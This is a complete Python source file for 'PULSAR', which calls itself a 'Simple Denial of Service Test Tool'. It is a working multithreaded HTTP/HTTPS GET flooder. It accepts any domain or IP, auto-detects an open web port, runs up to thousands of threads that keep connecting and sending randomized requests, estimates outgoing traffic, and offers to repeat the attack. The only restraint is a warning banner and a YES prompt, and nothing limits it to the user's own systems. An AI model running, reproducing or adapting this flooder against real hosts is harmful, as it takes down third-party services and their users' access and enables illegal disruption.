# PULSAR.py
# Copyright (c) 2025 SALOYEK
# Licensed under the MIT License. See LICENSE file for details.

import socket
import ssl
import threading
import time
import argparse
import sys
import random
import os

# --- Set Console Title ---
def set_console_title(title_text):
    if sys.platform == "win32":
        os.system(f"title {title_text}")
    else:
        sys.stdout.write(f"\x1b]2;{title_text}\x07")
        sys.stdout.flush()

PROGRAM_NAME = "PULSAR"
STOP_KEY_INFO = "ESC TO STOP" 

try:
    import keyboard 
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False
    keyboard = None 

# --- Global Variables ---
stop_event = threading.Event()
packets_sent = 0
bytes_sent = 0
user_interrupted_attack = False

# --- Appearance Configuration (ANSI Colors) ---
class Colors:
    HEADER = '\033[95m'; OKBLUE = '\033[94m'; OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
    ENDC = '\033[0m'; BOLD = '\033[1m'; UNDERLINE = '\033[4m'

LINE_SEP = Colors.OKBLUE + "-" * 70 + Colors.ENDC
BANNER = f"""
{Colors.OKCYAN}{Colors.BOLD}
██████╗ ██╗   ██╗██╗     ███████╗ █████╗ ██████╗ 
██╔══██╗██║   ██║██║     ██╔════╝██╔══██╗██╔══██╗
██████╔╝██║   ██║██║     ███████╗███████║██████╔╝
██╔═══╝ ██║   ██║██║     ╚════██║██╔══██║██╔══██╗
██║     ╚██████╔╝███████╗███████║██║  ██║██║  ██║
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{Colors.ENDC}
       {Colors.OKGREEN}Simple Denial of Service Test Tool{Colors.ENDC}
"""
DEFAULT_THREADS_LOW_RESOURCE = 5 
DEFAULT_THREADS_NORMAL = 100

# --- Helper Functions ---
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
    current_stop_key_info = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
    set_console_title(f"{PROGRAM_NAME} - {current_stop_key_info}")

def print_header(text): print(f"\n{LINE_SEP}\n {Colors.BOLD}{text.center(70)}{Colors.ENDC} \n{LINE_SEP}")
def print_warning(text): print(f"{Colors.WARNING}[!]{Colors.ENDC} {Colors.WARNING}WARNING: {text}{Colors.ENDC}")
def print_info(text): print(f"{Colors.OKCYAN}[*]{Colors.ENDC} INFO: {text}")
def print_success(text): print(f"{Colors.OKGREEN}[+]{Colors.ENDC} SUCCESS: {text}")
def print_error(text): print(f"{Colors.FAIL}[X]{Colors.ENDC} {Colors.FAIL}ERROR: {text}{Colors.ENDC}")

def get_random_user_agent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        f"{PROGRAM_NAME} Threaded Agent/1.0"
    ])

def format_size(num_bytes):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if abs(num_bytes) < 1024.0: return f"{num_bytes:.2f} {unit}"
        num_bytes /= 1024.0
    return f"{num_bytes:.2f} PB"

def is_valid_ip(address):
    try: socket.inet_aton(address); return True
    except socket.error: return False

# --- Main Attack Logic (Threading) ---
def attack_worker(target_ip, target_port, target_host_header, use_ssl):
    global packets_sent, bytes_sent
    path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_header}\r\nUser-Agent: {get_random_user_agent()}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
    request_bytes = request_str.encode('utf-8'); request_size = len(request_bytes)
    while not stop_event.is_set():
        conn = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(4) 
            if use_ssl: context = ssl.create_default_context(); conn = context.wrap_socket(sock, server_hostname=target_host_header)
            else: conn = sock
            conn.connect((target_ip, target_port)); conn.sendall(request_bytes)
            packets_sent += 1; bytes_sent += request_size
        except: pass # Ignore all errors in worker
        finally:
            if conn:
                try: conn.shutdown(socket.SHUT_RDWR); conn.close()
                except: pass

# --- Traffic Estimation Function ---
def estimate_traffic(target_input_for_est, port, num_threads, duration):
    print_info("Estimating traffic (this may take a moment)..."); target_ip_for_est = None; target_host_for_header_est = target_input_for_est 
    if is_valid_ip(target_input_for_est): target_ip_for_est = target_input_for_est
    else:
        try: target_ip_for_est = socket.gethostbyname(target_input_for_est)
        except socket.gaierror: print_error(f"Could not resolve domain '{target_input_for_est}' for traffic estimation."); return 0,0
    if not target_ip_for_est: print_error("Could not determine IP address for estimation."); return 0,0
    use_ssl = (port == 443); path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_for_header_est}\r\nUser-Agent: {get_random_user_agent()}\r\nConnection: close\r\n\r\n"
    single_request_size_bytes = len(request_str.encode('utf-8')); connections_per_sec_per_thread = 2.0; successful_connections = 0; total_time_for_test = 0.0
    num_test_connections = max(1, min(3, num_threads // 20 if num_threads > 0 else 1)) 
    if num_test_connections > 0:
        print_info(f"Performing {num_test_connections} test connections to {target_ip_for_est}:{port}...")
        for _ in range(num_test_connections):
            start_conn_time = time.perf_counter()
            try:
                sock_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock_test.settimeout(2)
                if use_ssl: context_test = ssl.create_default_context(); conn_test = context_test.wrap_socket(sock_test, server_hostname=target_host_for_header_est)
                else: conn_test = sock_test
                conn_test.connect((target_ip_for_est, port)); conn_test.shutdown(socket.SHUT_RDWR); conn_test.close()
                end_conn_time = time.perf_counter(); total_time_for_test += (end_conn_time - start_conn_time); successful_connections += 1
            except Exception: pass 
        if successful_connections > 0:
            avg_time_per_connection = total_time_for_test / successful_connections
            if avg_time_per_connection > 0.001: connections_per_sec_per_thread = 1.0 / avg_time_per_connection
            else: connections_per_sec_per_thread = 50.0 
            print_info(f"Average time per test connection: {avg_time_per_connection:.4f} s"); print_info(f"Estimated connections/sec/thread: {connections_per_sec_per_thread:.2f}")
        else: print_warning("Failed to perform test connections for estimation. Using default rate.")
    else: print_info("Skipped test connections (too few threads). Using default rate.")
    connections_per_sec_per_thread = min(connections_per_sec_per_thread, 100.0); connections_per_sec_per_thread = max(connections_per_sec_per_thread, 0.5)
    estimated_total_requests = num_threads * connections_per_sec_per_thread * duration; estimated_total_data_bytes = estimated_total_requests * single_request_size_bytes
    print_info(f"Single HTTP request size (payload): {single_request_size_bytes} B"); print_info(f"Estimated total HTTP requests: {int(estimated_total_requests)}")
    print_success(f"Estimated MINIMUM OUTGOING traffic (HTTP payload): {Colors.BOLD}{format_size(estimated_total_data_bytes)}{Colors.ENDC}")
    print_warning("This is a VERY ROUGH estimate..."); print_warning("It does not include protocol overhead or server responses.")
    return estimated_total_data_bytes, estimated_total_requests

# --- Interactive Input Function ---
def get_interactive_input():
    print_header(f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} Interactive Mode")
    current_default_threads = DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL
    target_input_val = "" 
    while not target_input_val:
        try:
            raw_target = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter target domain or IP address: ").strip()
            if not raw_target: print_warning("Target cannot be empty."); continue
            target_input_val = raw_target
        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
    target_port_val = None
    while target_port_val is None:
        try:
            raw_port = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter target port (80, 443, or empty for auto-detect): ").strip()
            if not raw_port: 
                print_info(f"Attempting to auto-detect port for {Colors.BOLD}{target_input_val}{Colors.ENDC}...")
                try:
                    print_info("Testing port 443 (HTTPS)..."); s_test_ssl = socket.create_connection((target_input_val, 443), timeout=2); s_test_ssl.close()
                    target_port_val = 443; print_success(f"Detected open port {Colors.BOLD}443 (HTTPS){Colors.ENDC} for {target_input_val}."); break
                except: 
                    print_warning(f"Port 443 (HTTPS) on {target_input_val} seems closed or unreachable.");
                    try:
                        print_info("Testing port 80 (HTTP)..."); s_test_http = socket.create_connection((target_input_val, 80), timeout=2); s_test_http.close()
                        target_port_val = 80; print_success(f"Detected open port {Colors.BOLD}80 (HTTP){Colors.ENDC} for {target_input_val}."); break
                    except: print_error(f"Could not auto-detect an open port for {target_input_val}. Please specify manually."); continue 
                if target_port_val is None: continue
            port_val_int = int(raw_port)
            if port_val_int not in [80, 443]: print_warning("Invalid port. Allowed: 80, 443."); continue
            target_port_val = port_val_int
        except ValueError: print_warning("That's not a valid port number.")
        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
    duration_val = None
    while duration_val is None:
        try:
            raw_duration = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter test duration in seconds (default: 60): ").strip()
            if not raw_duration: duration_val = 60; print_info(f"Using default duration: {Colors.BOLD}60 seconds{Colors.ENDC}."); break
            duration_val_int = int(raw_duration)
            if duration_val_int <= 0: print_warning("Duration must be greater than zero."); continue
            duration_val = duration_val_int
        except ValueError: print_warning("That's not a valid number of seconds.")
        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
    num_threads_val = None
    while num_threads_val is None:
        try:
            default_threads_prompt = f"default: {current_default_threads}"
            raw_threads = input(f"{Colors.OKCYAN}[?]{Colors.ENDC} Enter number of threads (e.g., {current_default_threads}, [{Colors.OKGREEN}{default_threads_prompt}{Colors.ENDC}]): ").strip()
            if not raw_threads: num_threads_val = current_default_threads; print_info(f"Using default threads: {Colors.BOLD}{current_default_threads}{Colors.ENDC}."); break
            threads_val_int = int(raw_threads)
            if threads_val_int <= 0: print_warning("Number of threads must be > 0."); continue
            if threads_val_int > 5000: print_warning(f"Threads ({threads_val_int}) EXTREMELY high...")
            elif threads_val_int > 2000 and KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) very high...")
            elif threads_val_int > 50 and not KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) high for no-ESC env.")
            num_threads_val = threads_val_int
        except ValueError: print_warning("That's not a valid number.")
        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
    return target_input_val, target_port_val, duration_val, num_threads_val

# --- ESC Key Press Callback ---
def esc_listener_thread_func():
    global user_interrupted_attack, stop_event
    if KEYBOARD_AVAILABLE and keyboard:
        try:
            keyboard.wait('esc', suppress=True) 
            if not stop_event.is_set():
                sys.stdout.write(f"\r{Colors.WARNING}{Colors.BOLD}ESC key detected!{Colors.ENDC} Stopping attack...                                        \n"); sys.stdout.flush()
                user_interrupted_attack = True; stop_event.set()
        except: pass

# --- Attack Execution Function ---
def run_attack(target_input_val, target_port_val, duration_val, num_threads_val):
    global packets_sent, bytes_sent, stop_event, user_interrupted_attack
    packets_sent = 0; bytes_sent = 0; stop_event.clear(); user_interrupted_attack = False
    current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
    current_attack_title = f"{PROGRAM_NAME} - Attacking {target_input_val}:{target_port_val} - {current_stop_key}"
    set_console_title(current_attack_title)
    print_header("Attack Configuration Summary")
    print_info(f"Target: {Colors.BOLD}{target_input_val}{Colors.ENDC}"); print_info(f"Port: {Colors.BOLD}{target_port_val}{Colors.ENDC}")
    print_info(f"Duration: {Colors.BOLD}{duration_val}s{Colors.ENDC}"); print_info(f"Threads: {Colors.BOLD}{num_threads_val}{Colors.ENDC}")
    target_ip_to_connect = None; target_host_for_header = target_input_val
    if is_valid_ip(target_input_val): target_ip_to_connect = target_input_val; print_info(f"Target '{target_input_val}' is IP.")
    else:
        print_info(f"Target '{target_input_val}' is domain. Resolving...");
        try: target_ip_to_connect = socket.gethostbyname(target_input_val); print_success(f"Resolved to IP: {target_ip_to_connect}")
        except socket.gaierror as e: print_error(f"Resolve failed: {e}"); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False 
    if not target_ip_to_connect: print_error("Could not get IP."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False
    estimate_traffic(target_input_val, target_port_val, num_threads_val, duration_val)
    try:
        confirm = input(f"{Colors.WARNING}[?]{Colors.ENDC} Start? ({Colors.OKGREEN}YES{Colors.ENDC}/{Colors.FAIL}NO{Colors.ENDC}): ").strip().upper()
        if confirm != 'YES': print_info("Cancelled."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return "cancelled"
    except KeyboardInterrupt: print_error("\nInput interrupted. Exiting."); sys.exit(1)
    use_ssl = (target_port_val == 443); print_header("Starting Attack")
    print_info(f"Attacking {Colors.BOLD}{target_ip_to_connect}:{target_port_val}{Colors.ENDC} for {duration_val}s...")
    listener_thread_obj = None
    if KEYBOARD_AVAILABLE: 
        print_info(f"Press {Colors.BOLD}ESC{Colors.ENDC} to stop early.")
        listener_thread_obj = threading.Thread(target=esc_listener_thread_func, daemon=True); listener_thread_obj.start()
    else: print_info(f"Press {Colors.BOLD}Ctrl+C{Colors.ENDC} to stop attack (ESC disabled).")
    threads_list = []; start_time = time.perf_counter()
    for _ in range(num_threads_val):
        thread = threading.Thread(target=attack_worker, args=(target_ip_to_connect, target_port_val, target_host_for_header, use_ssl))
        threads_list.append(thread); thread.daemon = True; thread.start()
    try:
        progress_bar_length = 30
        while True:
            elapsed_time = time.perf_counter() - start_time
            if elapsed_time >= duration_val or stop_event.is_set(): break 
            current_bytes = bytes_sent; current_packets = packets_sent
            bytes_per_sec = current_bytes / elapsed_time if elapsed_time > 0 else 0
            packets_per_sec = current_packets / elapsed_time if elapsed_time > 0 else 0
            progress = min(1.0, elapsed_time / duration_val); filled_length = int(progress_bar_length * progress)
            bar = '█' * filled_length + '-' * (progress_bar_length - filled_length)
            status_line = (f"\r{Colors.OKCYAN}Progress{Colors.ENDC}: [{Colors.OKGREEN}{bar}{Colors.ENDC}] {progress*100:.1f}% | "
                           f"{Colors.BOLD}{elapsed_time:.1f}s{Colors.ENDC}/{duration_val}s | Sent: {Colors.BOLD}{format_size(current_bytes)}{Colors.ENDC} "
                           f"({current_packets} pkts) | Speed: {Colors.BOLD}{format_size(bytes_per_sec)}/s{Colors.ENDC} ({packets_per_sec:.0f} pps)      ")
            sys.stdout.write(status_line); sys.stdout.flush(); time.sleep(0.1)
        if not stop_event.is_set() and not user_interrupted_attack: sys.stdout.write("\n"); print_info("Test duration elapsed.")
    except KeyboardInterrupt:
        if not KEYBOARD_AVAILABLE or not listener_thread_obj or not listener_thread_obj.is_alive():
            sys.stdout.write("\n"); print_warning("\nAttack interrupted (Ctrl+C)... Stopping."); user_interrupted_attack = True
            if not stop_event.is_set(): stop_event.set()
        else: sys.stdout.write("\n"); print_warning(f"\n(Ctrl+C ignored. Press {Colors.BOLD}ESC{Colors.ENDC} to stop.)"); pass 
    finally:
        set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); sys.stdout.write("\n"); sys.stdout.flush()
        if not stop_event.is_set(): stop_event.set()
        print_info("Waiting for threads to finish..."); time.sleep(0.5)
        final_elapsed_time = time.perf_counter() - start_time; print_header("Attack Results")
        print_info(f"Duration: {Colors.BOLD}{final_elapsed_time:.2f}s.{Colors.ENDC}"); print_info(f"Requests: {Colors.BOLD}{packets_sent}{Colors.ENDC}")
        print_info(f"Data Sent: {Colors.BOLD}{format_size(bytes_sent)}{Colors.ENDC}")
        if final_elapsed_time > 0:
            avg_bps = bytes_sent / final_elapsed_time; avg_pps = packets_sent / final_elapsed_time
            print_info(f"Avg Speed: {Colors.BOLD}{format_size(avg_bps)}/s{Colors.ENDC} ({avg_pps:.2f} pps)")
        if user_interrupted_attack: 
            interrupt_method = "ESC" if (KEYBOARD_AVAILABLE and listener_thread_obj and not listener_thread_obj.is_alive()) else "Ctrl+C"
            print_warning(f"Interrupted by user ({interrupt_method}).")
        print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---")
    return True

# --- Main Function ---
def main():
    is_color_supported = sys.stdout.isatty()
    if sys.platform == "win32":
        try: import ctypes; kernel32 = ctypes.windll.kernel32; kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7); is_color_supported = True
        except: is_color_supported = False 
    if not is_color_supported:
        for attr in dir(Colors):
            if attr.isupper(): setattr(Colors, attr, "")
    if not KEYBOARD_AVAILABLE:
        print(f"{Colors.WARNING}[!] Lib 'keyboard' not installed. ESC disabled.{Colors.ENDC}")
        print(f"{Colors.WARNING}Install: pip install keyboard. Use Ctrl+C to stop attack.{Colors.ENDC}")
        try: input(f"{Colors.OKGREEN}Press Enter to continue...{Colors.ENDC}")
        except KeyboardInterrupt: print_error("\nExiting."); sys.exit(1)
    clear_console(); print(BANNER)
    print_warning("USE RESPONSIBLY AND ONLY ON YOUR OWN SYSTEMS!"); print_warning("Misuse is ILLEGAL.")
    parser = argparse.ArgumentParser(description=f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} - DoS Test Tool.", epilog="Use responsibly!", formatter_class=argparse.RawTextHelpFormatter )
    parser.add_argument("target", nargs='?', help="Target domain or IP"); parser.add_argument("port", nargs='?', type=int, help="Port (80, 443)")
    parser.add_argument("duration", nargs='?', type=int, help="Duration (s)"); parser.add_argument("-t", "--threads", type=int, default=None, help="Number of threads")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    args = parser.parse_args()
    last_target = None; last_port = None; last_duration = None; last_threads = None
    cli_args_processed = False; get_new_params = True
    while True: 
        if get_new_params:
            if not cli_args_processed and not args.interactive and args.target and args.port is not None and args.duration is not None:
                print_info("Using CLI parameters..."); target, port, duration = args.target, args.port, args.duration
                threads = args.threads if args.threads and args.threads > 0 else (DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL)
                if threads > 5000: print_warning(f"CLI Threads ({threads}) EXTREMELY high...")
                elif threads > 2000 and KEYBOARD_AVAILABLE: print_warning(f"CLI Threads ({threads}) very high...")
                elif threads > 50 and not KEYBOARD_AVAILABLE: print_warning(f"CLI Threads ({threads}) high for no-ESC env.")
                last_target, last_port, last_duration, last_threads = target, port, duration, threads
                cli_args_processed = True
            else:
                if last_target and get_new_params : clear_console(); print(BANNER) # Tylko jeśli to nie pierwszy raz i chcemy nowe dane
                target, port, duration, threads = get_interactive_input()
                last_target, last_port, last_duration, last_threads = target, port, duration, threads
        get_new_params = True # Reset for next main loop iteration unless "Repeat" is chosen
        attack_result = run_attack(last_target, last_port, last_duration, last_threads)
        if attack_result == "cancelled": pass
        while True:
            print_header("What would you like to do next?")
            print(f"{Colors.OKCYAN}[1]{Colors.ENDC} Repeat last attack ({last_target}:{last_port}, {last_threads} threads)")
            print(f"{Colors.OKCYAN}[2]{Colors.ENDC} Start a new attack (new settings)")
            print(f"{Colors.OKCYAN}[3]{Colors.ENDC} Close program")
            try:
                choice = input(f"{Colors.OKGREEN}Your choice (1-3): {Colors.ENDC}").strip()
                if choice == '1': clear_console(); print(BANNER); get_new_params = False; break 
                elif choice == '2': get_new_params = True; break # Domyślne zachowanie, ale dla jasności
                elif choice == '3': print_info(f"Thank you for using {Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC}. Closing..."); sys.exit(0)
                else: print_warning("Invalid choice.")
            except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
        
if __name__ == "__main__":
    try: main()
    except SystemExit: pass
    except Exception as e: print_error(f"Unexpected global error: {type(e).__name__} - {e}")
    finally:
        if KEYBOARD_AVAILABLE and keyboard:
            try: keyboard.unhook_all() 
            except: pass
        current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Console"
        if sys.platform == "win32": os.system(f"title {current_stop_key}") 
        else: sys.stdout.write(f"\x1b]2;{current_stop_key}\x07"); sys.stdout.flush()
        print(Colors.ENDC)
